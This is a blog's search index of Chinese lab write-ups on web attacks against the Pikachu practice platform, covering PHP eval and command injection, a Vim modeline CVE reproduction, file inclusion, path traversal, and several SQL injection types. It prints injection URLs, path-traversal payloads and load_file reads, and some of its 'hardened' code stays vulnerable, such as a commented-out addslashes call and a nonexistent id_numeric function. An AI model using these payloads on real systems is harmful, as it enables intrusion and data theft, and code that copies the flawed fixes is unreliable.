<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[置顶]]></title>
    <url>%2F9102%2F01%2F01%2Ftop%2F</url>
    <content type="text"><![CDATA[该博客用于本人日常记录学习、复习过程，学习范围有Windows，Linux，安全，网络，C++，Python等内容，不定期更新！暂不开放评论功能（玻璃心）！]]></content>
  </entry>
  <entry>
    <title><![CDATA[RCE代码注入与远程命令执行]]></title>
    <url>%2F2019%2F08%2F19%2FRCE%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%2F</url>
    <content type="text"><![CDATA[实验环境 Pikachu漏洞联系平台 （Windows+Phpstudy环境） 火狐浏览器（附带插件HackBar与FoxyProxy） BurpSuite_Pro v1.7.26 破解版 漏洞平台地址为：http://192.168.1.101/pika 漏洞概述 PHP代码执行漏洞则是可以把代码注入应用到网站后端代码中，如果漏洞没有特殊过滤，就相当于直接有一个Web后门存在，该漏洞主要由于动态代码执行函数的参数过滤不严谨导致。 在应用需要调用一些外部程序处理内容的情况下，就会用到一些执行系统命令函数，例如system、exec、shell_exec等，当用户可以控制命令执行函数中的参数时将会注入恶意系统命令到正常命令中，造成命令执行功绩 常规eval代码注入eval函数可以把字符串按照php代码来执行，也就是说eval可以动态的执行php代码，代码示例如下：http://192.168.1.101/pika/vul/rce/rce_eval.php 1234567&lt;?phpif(isset($_POST[&apos;submit&apos;]) &amp;&amp; $_POST[&apos;txt&apos;] != null)&#123; if(@！eval($_POST[&apos;txt&apos;]))&#123; $html.=&quot;&lt;p&gt;你喜欢的字符还挺奇怪的!&lt;/p&gt;&quot;; &#125;&#125;?&gt; 当代码被执行时，攻击者可以通过参数值来执行恶意代码，如下图所示，参数利用;分割php语句，执行phpinfo()函数。 远程命令执行一般出现这种漏洞，是因为应用系统从设计上需要给用户提供指定的远程命令操作的接口，比如我们常见的路由器、防火墙、入侵检测等设备的web管理界面上 ，一般会给用户提供一个ping操作的web界面，用户从web界面输入目标IP，提交后，后台会对该IP地址进行一次ping测试，并返回测试结果。 而，如果，设计者在完成该功能时，没有做严格的安全控制，则可能会导致攻击者通过该接口提交“意想不到”的命令，从而让后台进行执行，从而控制整个后台服务器。 远程命令执行示例示例代码： 12345678910&lt;?phpif(isset($_POST[&apos;submit&apos;]) &amp;&amp; $_POST[&apos;ipaddress&apos;]!=null)&#123; $ip=$_POST[&apos;ipaddress&apos;]; if(stristr(php_uname(&apos;s&apos;), &apos;windows&apos;))&#123; //判断系统类型 $result.=shell_exec(&apos;ping &apos;.$ip);//直接将变量拼接进来，没做处理 &#125;else &#123; $result.=shell_exec(&apos;ping -c 4 &apos;.$ip); &#125;&#125;?&gt; 当用户正常使用该命令接口时如下图所示：使用特殊符号拼接命令，使其起到查看当前目录下文件的功能：操作系统中的命令连接符： 123456&amp; &amp;&amp; | ||&amp;&amp; 表示前一条命令执行成功时，才执行后一条命令&amp; 表示命令在后台执行| 将上一条命令的输出内容做为下一条命令的输入参数|| 表示上一条命令执行失败后，才执行下一条命令 代码加固1234567891011121314151617&lt;?php$result=&apos;&apos;;if(isset($_POST[&apos;submit&apos;]) &amp;&amp; $_POST[&apos;ipaddress&apos;]!=null)&#123; $ip=$_POST[&apos;ipaddress&apos;]; $check=explode(&apos;.&apos;, $ip); if ((is_numeric($check[0])) &amp;&amp; (is_numeric($check[1])) &amp;&amp; (is_numeric($check[2])) &amp;&amp; (is_numeric($check[3])) &amp;&amp; (sizeof($check) == 4) ) &#123; $ip = $check[0].&apos;.&apos;.$check[1].&apos;.&apos;.$check[2].&apos;.&apos;.$check[3]; if(stristr(php_uname(&apos;s&apos;), &apos;windows&apos;))&#123; //判断系统类型 $result.=shell_exec(&apos;ping &apos;.$ip);//直接将变量拼接进来，没做处理 &#125;else &#123; $result.=shell_exec(&apos;ping -c 4 &apos;.$ip); &#125; &#125;else&#123; print(&quot;请输入正确的IP地址&quot;); &#125;&#125;?&gt; 代码加固效果如下图：]]></content>
      <categories>
        <category>WEB安全</category>
        <category>PHP</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[CVE-2019-12735（Vim远程代码执行）漏洞复现]]></title>
    <url>%2F2019%2F08%2F05%2FCVE-2019-12735%EF%BC%88Vim%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%EF%BC%89%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%2F</url>
    <content type="text"><![CDATA[参考博客：https://blog.csdn.net/DarkHQ/article/details/92696160 一、实验环境 KaliLinux 2018 Vim 8.0.1401 二、漏洞影响版本 VIM &lt; 8.1.1365 Neovim &lt; 0.3.6 三、漏洞环境复现由于当前VIM版本没有默认开启modeline，需自己手动添加下，修改home/.vimrc文件，添加一条规则set modeline（如果没有.vimrc文件，自己手动创建一个）脚本是大佬pcy190编写的，链接：https://github.com/pcy190/ace-vim-neovim/一个尝试执行uname的poc，一个利用nc反弹shell的poc 四、漏洞复现侦听本机9999端口在一个新终端上使用VIM编辑poc_shell.txt 五、漏洞防护 更新vim到最新版本 禁用编辑器的 modeline功能，把set modeline 改为set nomodeline 利用vim编辑的时候，查看文件来源是否正规]]></content>
      <categories>
        <category>系统漏洞</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[文件包含与目录遍历]]></title>
    <url>%2F2019%2F08%2F04%2F%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E4%B8%8E%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86%2F</url>
    <content type="text"><![CDATA[实验环境 Pikachu漏洞联系平台 （Windows+Phpstudy环境） 火狐浏览器（附带插件HackBar与FoxyProxy） BurpSuite_Pro v1.7.26 破解版 漏洞平台地址为：http://192.168.31.193/pika漏洞概述 程序开发人员希望代码更加灵活，所以通常会把可重复使用的函数写入到单个文件中，在使用某些函数时，用来进行动态调用，而无需再次编写，这种调用文件的过程被称为包含，但正是因为这种灵活性，导致客户端可以调用一个恶意文件，造成文件包含漏洞。 有时候由于网站功能需求，会让前端用户选择要包含的文件，而开发人员又没有对传入的的文件进行合理的校验或校验被绕过，从而导致攻击者可以通过修改文件的位置来让后台操作其他文件，因此导致意外的文件泄露甚至恶意的代码注入。 File include文件包含漏洞危害： include本地文件包含LFI； 远程系统文件包含RFI（可传入木马）通常为如include函数，可以将web根目录以外的目录包含进来。 形成漏洞根源：include函数对输入变量限制不严，可以被用户控制，包含其他恶意文件，导致了执行了非预期的代码 文件包含的函数： 1234require()，找不到被包含的文件时会产生致命错误，并停止脚本运行。include()，找不到被包含的文件时只会产生警告，脚本将继续运行。include_once()与include()类似，唯一区别是如果该文件中的代码已经被包含，则不会再次包含。require_once()与require()类似，唯一区别是如果该文件中的代码已经被包含，则不会再次包含。 常见漏洞特征： http://xxx/index.php?page=a.phphttp://xxx/index.php?home=b.htmlhttp://xxx/index.php?file=content 漏洞测试方法：?page=/etc/passwd?page=../../../../../../../../../../../etc/passwd?page=http://192.168.0.13/a.php #类UNIX系统根目录：/目录层级分隔符：/ #windows系统根目录：C:\，D:\，E:\ 等目录层级分隔符：\或/ 示例代码: 1234&lt;?php $filename = $_GET[&apos;filename&apos;]; include($filename);?&gt; $_GET[&#39;filename&#39;]参数开发者没有经过严格的过滤，直接带入了include的函数，攻击者可以通过修改$_GET[&#39;filename&#39;]的值，执行非预期的操作。 本地文件包含漏洞 本地文件包含示例代码示例：123456&lt;?phpif(isset($_GET[&apos;submit&apos;]) &amp;&amp; $_GET[&apos;filename&apos;]!=null)&#123; $filename=$_GET[&apos;filename&apos;]; include &quot;include/$filename&quot;;//变量传进来直接包含,没做任何的安全限制&#125;?&gt; 正常访问网页，提交查询kobe访问的网页URL为:http://192.168.31.193/pika/vul/fileinclude/fi_local.php?filename=file1.php&amp;submit=提交查询当提交参数filename值修改为../../../../../../../../../../flag.txt时，则页面内容改编为flag.txt文件内容 远程文件包含漏洞PHP的配置文件(/etc/php5/cgi/php.ini )中的allow_url_include设置为ON，include/require等包含函数可以加载远程文件，如果远程文件没经过严格的过滤，导致了执行恶意文件的代码，这就是远程文件包含漏洞。 远程文件包含示例代码示例：123456&lt;?phpif(isset($_GET[&apos;submit&apos;]) &amp;&amp; $_GET[&apos;filename&apos;]!=null)&#123; $filename=$_GET[&apos;filename&apos;]; include &quot;include/$filename&quot;;//变量传进来直接包含,没做任何的安全限制&#125;?&gt; 建立站点用来远程文件包含漏洞中被包含，URL:http://192.168.31.193/7/cmd.txt通过远程文件包含漏洞，包含http://192.168.31.193/7/cmd.txt在webshell中执行系统命令，查看当前用户 Directory Traversal 目录遍历漏洞危害：本台机器操作系统上文件进行读取使用者可以通过浏览器/URL地址或者参数变量内容，可以读取web根目录【默认为:/var/www/】之外的其他操作系统文件(如：/etc/passwd/)。形成漏洞根源：目录权限限制不严格 目录遍历漏洞示例示例代码： 123456&lt;?phpif(isset($_GET[&apos;title&apos;]))&#123; $filename=$_GET[&apos;title&apos;]; //这里直接把传进来的内容进行了require(),造成问题 require &quot;soup/$filename&quot;;?&gt; URL:http://192.168.31.193/pika/vul/dir/dir_list.php?title=jarheads.php 修改url中title参数的值为../../../../../../../../../../flag.txt]]></content>
      <categories>
        <category>WEB安全</category>
        <category>PHP</category>
        <category>文件目录安全</category>
      </categories>
      <tags>
        <tag>文件目录安全</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[SQL盲注进阶——BurpSuite]]></title>
    <url>%2F2019%2F08%2F01%2FSQL%E7%9B%B2%E6%B3%A8%E6%B3%A8%E5%85%A5%E8%BF%9B%E9%98%B6%2F</url>
    <content type="text"><![CDATA[一、实验环境 Pikachu漏洞联系平台 （Windows+Phpstudy环境） 火狐浏览器（附带插件HackBar与FoxyProxy） BurpSuite_Pro v1.7.26 破解版 漏洞平台地址为：http://192.168.31.193/pika 二、Burpsuite——Intruder模块简介Burp Intruder是一个强大的工具，用于自动对Web应用程序自定义的攻击，Burp Intruder 是高度可配置的，并被用来在广范围内进行自动化攻击。你可以使用 Burp Intruder 方便地执行许多任务，包括枚举标识符，获取有用数据，漏洞模糊测试。合适的攻击类型取决于应用程序的情况，可能包括：缺陷测试：SQL 注入，跨站点脚本，缓冲区溢出，路径遍历；暴力攻击认证系统；枚举；操纵参数；拖出隐藏的内容和功能；会话令牌测序和会话劫持；数据挖掘；并发攻击；应用层的拒绝服务式攻击。 三、Intruder模块说明Burp Intruder主要有四个模块组成:1：Target 用于配置目标服务器进行攻击的详细信息。2：Positions 设置Payloads的插入点以及攻击类型（攻击模式）。3：Payloads 设置payload，配置字典4：Opetions 此选项卡包含了request headers，request engine，attack results ，grep match，grep_extrack，grep payloads和redirections。你可以发动攻击之前，在主要Intruder的UI上编辑这些选项，大部分设置也可以在攻击时对已在运行的窗口进行修改。 四、搭配Intruder自动爆破数据库 将截断的数据包发送至Intruder 设置Pyloads的插入点 设置Pyload，导入字典 启动自动攻击观察攻击运行至什么pyload时，会停留延时]]></content>
      <categories>
        <category>WEB安全</category>
        <category>PHP</category>
        <category>SQL注入</category>
      </categories>
      <tags>
        <tag>SQL注入</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[SQL盲注注入]]></title>
    <url>%2F2019%2F07%2F30%2FSQL%E6%B3%A8%E5%85%A5-%E7%9B%B2%E6%B3%A8%2F</url>
    <content type="text"><![CDATA[一、实验环境 Pikachu漏洞联系平台 （Windows+Phpstudy环境） 火狐浏览器（附带插件HackBar与FoxyProxy） BurpSuite_Pro v1.7.26 破解版 漏洞平台地址为：http://192.168.31.193/pika 二、漏洞概述盲注是指数据库查询结果无法从直观页面中获取，攻击者通过使用数据库逻辑或数据库执行延时等方法获取想要的信息。在一下几种情况中可能需要用到盲注手段： 部分网站没有输出显示，只能通过延时判断 不管正确或者错误的输入，都只显示两种情况 部分网站没办法 union select 联合查询方式注入 布尔盲注布尔盲注利用MySQL条件不成立时返回空内容，条件成立时返回正常数据的特点来进行攻击。比如MySQL中有一个substr函数，他可以截取M有SQL内部返回值与某一字符进行比较，通过遍历比较就可以还原出攻击者想得到的结果。 时间盲注同理，时间盲注通过substr截取字段返回信息的字符，通过一个个字符推算出最终的数据。和布尔盲注不同的是，时间盲注不是依据页面是否返回空内容来判断是否成立而是根据响应时间来判断。如果条件成立，页面就会比平时的响应速度更慢。 三、SQL语句原理 检测延时注入 12345678mysql&gt; select id,username from member where id=&apos;1&apos;union select 1,sleep(10);+----+----------+ | id | username |+----+----------+| 1 | vince || 1 | 0 |+----+----------+2 rows in set (10.00 sec) 猜测数据库长度 1234567891011121314151617181920212223242526mysql&gt; select database() -&gt; ;+------------+| database() |+------------+| pikachu |+------------+1 row in set (0.00 sec)mysql&gt; select id,username from member where id=&apos;1&apos;union select 2,sleep(if((length(database())=7),10,0));+----+----------+| id | username |+----+----------+| 1 | vince || 2 | 0 |+----+----------+2 rows in set (10.00 sec)mysql&gt; select id,username from member where id=&apos;1&apos;union select 2,sleep(if((length(database())=6),10,0));+----+----------+| id | username |+----+----------+| 1 | vince || 2 | 0 |+----+----------+2 rows in set (0.00 sec) if(条件,a,b)//若条件为TRUE则返回a,若条件为FALSE则返回b length(database()); //返回当前数据库名的长度 猜测数据库名称 123456789101112131415mysql&gt; select ascii(substr(database(),1,1));+-------------------------------+| ascii(substr(database(),1,1)) |+-------------------------------+| 112 |+-------------------------------+1 row in set (0.00 sec)mysql&gt; select id,username from member where id=&apos;i&apos; union select 1,if((ascii(substr(database(),1,1))=112),sleep(10),NULL);+----+----------+| id | username |+----+----------+| 1 | 0 |+----+----------+1 row in set (10.00 sec) substr(string,start,length) string:必选，被截取的字段 start:当该参数为正数时从字符串指定位置开始截取 当该参数为负数时从字符串结尾指定位置开始截取 length:需要截取的长度，缺省，即截取到结束位置。 ascii(str) 返回字符串最左边的字符的ascii码 四、布尔盲注实例 观察网页正常回显 在name=kobe后面加上一个“ &#39; ”，然后观察页面回显 出现这种情况就可能存在注入点，为确保准确性，猜测该位置的SQL查询语句就是用“ &#39; ”，进行闭合。修改URL为http://192.168.31.193/pika/vul/sqli/sqli_blind_b.php?name=kobe%27+--+&amp;submit=查询# 成功返回正常的页面，现在可以100%确定该网页存在注入漏洞，下面就可以进一步进行渗透 五、时间盲注检测 观察网页页面回显，发现无论提交什么参数都是相同的回显 构造延时查询的SQL语句进行注入 通过图5-7，可以说明该网站在返回请求时延时了10秒 猜测数据库名称长度在判断数据库名称为7时延时了10秒，证明当前数据库名称长度为7 猜测数据库名称中第一位字符体现在网页中就是当你猜中了数据库名的第1位，网页加载时间变长为10s；ascii 112=p]]></content>
      <categories>
        <category>WEB安全</category>
        <category>PHP</category>
        <category>SQL注入</category>
      </categories>
      <tags>
        <tag>SQL注入</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[SQL宽字节注入]]></title>
    <url>%2F2019%2F07%2F28%2FSQL%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5%2F</url>
    <content type="text"><![CDATA[一、实验环境 Pikachu漏洞联系平台 （Windows+Phpstudy环境） 火狐浏览器（附带插件HackBar与FoxyProxy） BurpSuite_Pro v1.7.26 破解版 漏洞平台地址为：http://192.168.31.193/pika 二、漏洞概述在实际环境中，程序员很少会写一点防护都没有的代码，宽字节注入源于程序员设置MySQL连接时错误配置为“set character_set_client=gbk”，这样配置会引发编码转换从而导致注入漏洞， 正常情况下，当GPC开启或使用addslashes函数过滤GET或POST提交的参数时，攻击者使用的“&#39;”就会被转义为“\‘”。 但如果存在宽字节注入%df%27时，首先经过单引号转义成%df%5c%27（%5c是反斜杠\，%27是单引号’），之后在数据库查询前使用了GBK多字节编码，即在汉字编码范围内两个字节会被编码为有个汉字。 然后MySQL服务器会对查询语句进行GBK编码，即%df%5c转换成汉字“運”，而单引号逃逸了出来从而照成注入漏洞。 三、实验准备在我们使用的PIKACHU漏洞练习平台中，宽字节注入实验默认关闭了MySQL的错误描述显示，为方便学习理解，需要开启MySQL的错误描述：修改\pika\vul\sqli\sqli_widebyte.php文件,将$result=mysqli_query($link, $query);修改为$result=execute($link, $query); 四、实验演示 检测注入点使用Burp截断转发功能修改报文将修改完毕后的报文发送给WEB服务器，观察网页回显 12341%df&apos;==1運 &apos;=\&apos; \==%5c %df%5c%27==運&apos; 猜测该网页SQL的查询语句为：select id,email from *** where ***=&#39;$name&#39; 构造SQL注入语句构造查看数据库与用户的SQL语句注入结果 五、理解代码原理与代码加固 代码理解与分析 12345678910111213141516171819202122232425$link=connect();$html=&apos;&apos;;if(isset($_POST[&apos;submit&apos;]) &amp;&amp; $_POST[&apos;name&apos;]!=null)&#123; //escape在这的功能类似$name = addslashes($name) $name = escape($link,$_POST[&apos;name&apos;]); $query=&quot;select id,email from member where username=&apos;$name&apos;&quot;;//这里的变量是字符型，需要考虑闭合 //设置mysql客户端来源编码是gbk,这个设置导致出现宽字节注入问题 $set = &quot;set character_set_client=gbk&quot;; execute($link,$set); //mysqi_query不打印错误描述 //$result=mysqli_query($link, $query); $result=execute($link, $query); if(mysqli_num_rows($result) &gt;= 1)&#123; while ($data=mysqli_fetch_assoc($result))&#123; $id=$data[&apos;id&apos;]; $email=$data[&apos;email&apos;]; $html.=&quot;&lt;p class=&apos;notice&apos;&gt;your uid:&#123;$id&#125; &lt;br /&gt;your email is: &#123;$email&#125;&lt;/p&gt;&quot;; &#125; &#125;else&#123; $html.=&quot;&lt;p class=&apos;notice&apos;&gt;您输入的username不存在，请重新输入！&lt;/p&gt;&quot;; &#125;&#125; set character_set_client=gbk 是导致该漏洞的主要原因，其他代码会导致该漏洞，具体如下： 123set character_set_connection=gbk;set character_set_results=gbk;mysql_query(&quot;SET NAMES &apos;gbk&apos;&quot;); 代码加固与防护为了防止宽字节编码出现的参数问题，现在开发者基本上都会选择将MySQL连接配置为set character_set_client=binary来避免宽字节编码的问题发生。 12345678910111213141516171819202122232425262728$link=connect();$html=&apos;&apos;;if(isset($_POST[&apos;submit&apos;]) &amp;&amp; $_POST[&apos;name&apos;]!=null)&#123; $name = escape($link,$_POST[&apos;name&apos;]); $query=&quot;select id,email from member where username=&apos;$name&apos;&quot;;//这里的变量是字符型，需要考虑闭合 //设置mysql客户端来源编码是gbk,这个设置导致出现宽字节注入问题 //$set = &quot;set character_set_client=gbk&quot;; //将MySQL连接配置为binary $set = &quot;set character_set_client=binary&quot;; execute($link,$set); //mysqi_query不打印错误描述 //$result=mysqli_query($link, $query); $result=execute($link, $query); if(mysqli_num_rows($result) &gt;= 1)&#123; while ($data=mysqli_fetch_assoc($result))&#123; $id=$data[&apos;id&apos;]; $email=$data[&apos;email&apos;]; $html.=&quot;&lt;p class=&apos;notice&apos;&gt;your uid:&#123;$id&#125; &lt;br /&gt;your email is: &#123;$email&#125;&lt;/p&gt;&quot;; &#125; &#125;else&#123; $html.=&quot;&lt;p class=&apos;notice&apos;&gt;您输入的username不存在，请重新输入！&lt;/p&gt;&quot;; &#125;&#125; 测试防护效果]]></content>
      <categories>
        <category>WEB安全</category>
        <category>PHP</category>
        <category>SQL注入</category>
      </categories>
      <tags>
        <tag>SQL注入</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[pikachu环境搭建]]></title>
    <url>%2F2019%2F07%2F28%2Fpikachu%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%2F</url>
    <content type="text"><![CDATA[一、需求环境 Win7 64位 phpstudy 2018 pikachu-master(pikachu漏洞练习平台) 二、安装步骤 在Win7系统中安装phpStudy(官方版为一键解压包)启动phpstudy（Mysql默认用户：root，默认密码：root） 搭建pikachu漏洞练习平台将pikachu-master解压至C:\phpStudy\PHPTutorial\WWW（用于存放网页文件的目录）初始化pikachu平台访问http://127.0.0.1/pikachu-master/install.php 搭建完成，可以开始实验]]></content>
      <categories>
        <category>WEB安全</category>
        <category>PHP</category>
        <category>环境搭建</category>
      </categories>
      <tags>
        <tag>Windows</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[SQL数字型注入 （POST）]]></title>
    <url>%2F2019%2F07%2F28%2FSQL%E6%95%B0%E5%AD%97%E5%9E%8B%E6%B3%A8%E5%85%A5-POST%2F</url>
    <content type="text"><![CDATA[一、实验环境 Pikachu漏洞联系平台 （Windows+Phpstudy环境） 火狐浏览器（附带插件HackBar与FoxyProxy） BurpSuite_Pro v1.7.26 破解版 漏洞平台地址为：http://192.168.31.193/pika 二、实验步骤 观察注入点尝试在表单的下拉菜单中提交任意数据，观察URL与网页URL：http://192.168.31.193/pika/vul/sqli/sqli_id.php ，如图2-1所示：可以看到页面回显正常，但URL部分没有传值参数，判断该网页请求方式为POST 检测注入点该网页请求方式为POST所以我们需要用到Hackbar或者BurpSuite，这里使用Burp设置好代理后重新提交参数，并用Burp截断HTTP的报文，如图2-2所示：将该报文发送至Repeater即可开始进行注入测试，如图2-3所示：尝试在id=1参数修改为id=1 or 1=1,然后发送报文，查看Response，如图2-4所示：可以看到我们拼接的逻辑运算语句正常运行，并把数据表中的所有数据都显示出来 查询显示的字段数尝试使用order by语句判断该网页表单能够显示的字段数，如图2-5所示： 获取当前数据库及运行数据库的用户名使用union select拼接SQL语句查看用户及数据库，如图2-6所示： 三、代码理解与防范 源代码(pika\vul\sqli\sqli_id.php) 12345678910111213141516171819$link=connect();$html=&apos;&apos;;if(isset($_POST[&apos;submit&apos;]) &amp;&amp; $_POST[&apos;id&apos;]!=null)&#123; //这里没有做任何处理，直接拼到select里面去了,形成Sql注入 $id=$_POST[&apos;id&apos;]; $query=&quot;select username,email from member where id=$id&quot;; $result=execute($link, $query); //这里如果用==1,会严格一点 if(mysqli_num_rows($result)&gt;=1)&#123; while($data=mysqli_fetch_assoc($result))&#123; $username=$data[&apos;username&apos;]; $email=$data[&apos;email&apos;]; $html.=&quot;&lt;p class=&apos;notice&apos;&gt;hello,&#123;$username&#125; &lt;br /&gt;your email is: &#123;$email&#125;&lt;/p&gt;&quot;; &#125; &#125;else&#123; $html.=&quot;&lt;p class=&apos;notice&apos;&gt;您输入的user id不存在，请重新输入！&lt;/p&gt;&quot;; &#125;&#125; 通过判断参数类型对网页起到防护作用 1234567891011121314151617181920$link=connect();$html=&apos;&apos;;//&amp;&amp; id_numeric($_POST[&apos;id&apos;])判断从网页传入的值是否为数字，如果带有其他字符将不运行后面的代码if(isset($_POST[&apos;submit&apos;]) &amp;&amp; $_POST[&apos;id&apos;]!=null &amp;&amp; id_numeric($_POST[&apos;id&apos;]))&#123; //这里没有做任何处理，直接拼到select里面去了,形成Sql注入 $id=$_POST[&apos;id&apos;]; //数字型注入与字符型注入不同的地方是因为id=$id并没有使用符号进行闭合 $query=&quot;select username,email from member where id=$id&quot;; $result=execute($link, $query); //这里如果用==1,会严格一点 if(mysqli_num_rows($result)&gt;=1)&#123; while($data=mysqli_fetch_assoc($result))&#123; $username=$data[&apos;username&apos;]; $email=$data[&apos;email&apos;]; $html.=&quot;&lt;p class=&apos;notice&apos;&gt;hello,&#123;$username&#125; &lt;br /&gt;your email is: &#123;$email&#125;&lt;/p&gt;&quot;; &#125; &#125;else&#123; $html.=&quot;&lt;p class=&apos;notice&apos;&gt;您输入的user id不存在，请重新输入！&lt;/p&gt;&quot;; &#125;&#125;]]></content>
      <categories>
        <category>WEB安全</category>
        <category>PHP</category>
        <category>SQL注入</category>
      </categories>
      <tags>
        <tag>SQL注入</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[SQL字符型注入 （GET）]]></title>
    <url>%2F2019%2F07%2F27%2FSQL%E5%AD%97%E7%AC%A6%E5%9E%8B%E6%B3%A8%E5%85%A5-GET%2F</url>
    <content type="text"><![CDATA[一、实验环境 Pikachu漏洞联系平台 （Windows+Phpstudy环境） 火狐浏览器（附带插件HackBar） 漏洞平台地址为：http://192.168.31.193/pika 二、SQL注入原理数据库注入漏洞，主要是开发人员在构建代码时，没有对输入边界进行安全考虑，导致攻击可以通过合法的输入点提交一些精心构造的语句，从而欺骗后台数据库进行执行，导致数据库信息泄露的一种漏洞。 三、实验步骤 观察注入点尝试在表单中提交数据 kobe 观察URL：http://192.168.31.193/pika/vul/sqli/sqli_str.php?name=kobe&amp;submit=查询， 与网页中的表单，如图1-1所示： 检测注入点尝试在name=kobe参数后面加上 ‘ (URL编码为：%27）然后观察页面变化，URL:http://192.168.31.193/pika/vul/sqli/sqli_str.php?name=kobe&#39;submit=查询可以看到加上之后页面内容报错，出现这种现象大多数情况下时存在注入点，如图1-2所示: 查询显示的字段数尝试使用order by语句判断该网页表单能够显示的字段数，URL:http://192.168.31.193/pika/vul/sqli/sqli_str.php?name=1%27order+by+3+--+&amp;submit=查询， 出现“Unknown column ‘3’ in ‘order clause’” ，3表示已经超出表单的显示数量，所以该表单的字段的显示数量为2个字段，如图1-3所示： 获取当前数据库及运行数据库的用户名使用联合查询语句union select 获取当前的数据库及运行Mysql服务的用户URL:http://192.168.31.193/pika/vul/sqli/sqli_str.php?name=1%27union+select+database(),user()+--+&amp;submit=查询 ，效果如图1-4所示： 通过SQL注入漏洞读取WEB服务器本地的文件内容使用load_file()语句读取本地C盘中的flag.txt文件内容URL：http://192.168.31.193/pika/vul/sqli/sqli_str.php?name=1%27%20union%20select%20null,load_file(%22C:\\flag.txt%22)+--+&amp;submit=查询 ，效果如图1-5所示：flag.txt文件内容： 四、代码理解与防范 源代码(pika\vul\sqli\sqli_str.php) 12345678910111213141516171819$link=connect();$html=&apos;&apos;;if(isset($_GET[&apos;submit&apos;]) &amp;&amp; $_GET[&apos;name&apos;]!=null)&#123; //这里没有做任何处理，直接拼到select里面去了 $name=$_GET[&apos;name&apos;]; //这里的变量是字符型，需要考虑闭合 $query=&quot;select id,email from member where username=&apos;$name&apos;&quot;; $result=execute($link, $query) ; if(mysqli_num_rows($result)&gt;=1)&#123; while($data=mysqli_fetch_assoc($result))&#123; $id=$data[&apos;id&apos;]; $email=$data[&apos;email&apos;]; $html.=&quot;&lt;p class=&apos;notice&apos;&gt;your uid:&#123;$id&#125; &lt;br /&gt;your email is: &#123;$email&#125;&lt;/p&gt;&quot;; &#125; &#125;else&#123; $html.=&quot;&lt;p class=&apos;notice&apos;&gt;您输入的username不存在，请重新输入！&lt;/p&gt;&quot;; &#125;&#125; 通过函数转义的方式对源代码进行加固 123456789101112131415161718192021$link=connect();$html=&apos;&apos;;if(isset($_GET[&apos;submit&apos;]) &amp;&amp; $_GET[&apos;name&apos;]!=null)&#123; //这里没有做任何处理，直接拼到select里面去了 $name=$_GET[&apos;name&apos;]; //addslashes()若$name所传入的字符串中带有特殊字符，则该函数会在特殊符号前添加“/”，表示将其转义 //$name = addslashes($name); //这里的变量是字符型，需要考虑闭合 $query=&quot;select id,email from member where username=&apos;$name&apos;&quot;; $result=execute($link, $query) ; if(mysqli_num_rows($result)&gt;=1)&#123; while($data=mysqli_fetch_assoc($result))&#123; $id=$data[&apos;id&apos;]; $email=$data[&apos;email&apos;]; $html.=&quot;&lt;p class=&apos;notice&apos;&gt;your uid:&#123;$id&#125; &lt;br /&gt;your email is: &#123;$email&#125;&lt;/p&gt;&quot;; &#125; &#125;else&#123; $html.=&quot;&lt;p class=&apos;notice&apos;&gt;您输入的username不存在，请重新输入！&lt;/p&gt;&quot;; &#125;&#125; 测试防护效果]]></content>
      <categories>
        <category>WEB安全</category>
        <category>PHP</category>
        <category>SQL注入</category>
      </categories>
      <tags>
        <tag>SQL注入</tag>
      </tags>
  </entry>
</search>
